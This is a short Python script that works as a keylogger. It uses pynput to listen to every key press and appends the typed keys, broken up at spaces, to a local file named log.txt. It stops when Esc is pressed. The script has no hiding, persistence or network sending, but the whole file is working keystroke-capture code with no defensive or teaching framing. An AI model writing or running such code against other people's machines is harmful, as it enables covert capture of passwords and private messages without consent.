from typing import List
from pynput.keyboard import Key, Listener


keys = []
last_key = ""


def on_press(key):
    global last_key, keys

    if key == Key.space:
        if last_key == key:
            pass
        else:
            last_key = key
            keys.append(" ")
            write_file(keys)
            keys.clear()
    elif len(keys) and key == Key.backspace:
        keys.remove(keys[-1])
    else:
        last_key = key
        keys.append(key)


def write_file(keys: List[str]):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
        f.write("\n")


def on_release(key):
    if key == Key.esc:
        return False


def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
